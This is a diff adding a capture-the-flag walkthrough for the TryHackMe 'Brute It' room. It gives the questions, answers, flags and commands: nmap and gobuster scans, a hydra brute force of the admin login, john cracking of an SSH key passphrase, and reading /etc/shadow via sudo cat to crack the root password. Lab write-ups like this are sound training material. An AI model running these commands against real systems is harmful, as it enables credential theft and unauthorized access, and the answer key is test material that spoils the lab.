@@ -1,0 +1,103 @@
+https://tryhackme.com/room/bruteit
+
+Machine IP: 10.144.139.25
+Attack Machine: Kali VM on host machine with OpenVPN profile
+
+# commands
+## comments
+------------------------------------------------------------------------------------------------
+RECONNAISSANCE
+Q: How many ports are open?
+A: 2
+
+# nmap -sV -T5 10.144.139.25
+
+Q: What version of SSH is running?
+A: OpenSSH 7.6p1
+
+# nmap -sV -T5 10.144.139.25
+
+Q: What version of Apache is running?
+A: 2.4.29
+
+# nmap -sV -T5 10.144.139.25
+
+Q: Which Linux distribution is running?
+A: Ubuntu
+
+# nmap -sV -T5 10.144.139.25
+
+Search for hidden directories on web server.
+Q: What is the hidden directory?
+A: /admin
+
+# gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://10.144.139.25
+------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------
+GETTING A SHELL
+Q: What is the user:password of the admin panel?
+A: admin:xavier
+
+# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.144.139.25 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
+
+## Inspect the login page HTML
+## /admin/ is the page that the login is submitted on
+## the login of 'admin' is written into the HTML, that's how we know it
+## username field is assigned as 'user'
+## password field is assigned as 'pass'
+## failure message is exactly 'Username or password invalid'
+## For exact failure message, can use curl:
+# curl -i -s -X POST http://10.144.139.25/admin/ --data "user=admin&pass=thisshouldnotworklol"
+
+Crack the RSA key you found.
+Q: What is John's RSA Private Key passphrase?
+A: rockinroll
+
+## Copy/paste RSA key info into new file
+## My new file name for it: rsa
+
+# ssh2john rsa > crackme
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+
+## To login, need to change permissions then ssh into the box
+# chmod 600 rsa
+# ssh john@10.144.139.25 -i rsa
+# yes
+# rockinroll
+
+Q: user.txt
+A: THM{a_password_is_not_a_barrier}
+
+# cat user.txt
+
+Q: Web flag
+A: THM{brut3_f0rce_is_e4sy}
+
+## It's on the web page where you log in with admin:xavier
+------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------
+PRIVILEGE ESCALTION
+Find a form to escalate your privileges.
+Q: What is the root's password?
+A: football
+
+# sudo -l
+
+## User john may run the following commands on bruteit:
+##     (root) NOPASSWD: /bin/cat
+## Cool, we can sudo cat so we can get the /etc/passwd and /etc/shadow files
+
+## Copy and paste the /etc/passwd entry for root to a file name passwd
+## Copy and paste the /etc/shadow entry for root to a file name shadow
+
+# unshadow passwd shadow > unshadowed.txt
+
+# john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+Q: root.txt
+A: THM{pr1v1l3g3_3sc4l4t10n}
+
+# su - root
+# football
+# cat root.txt
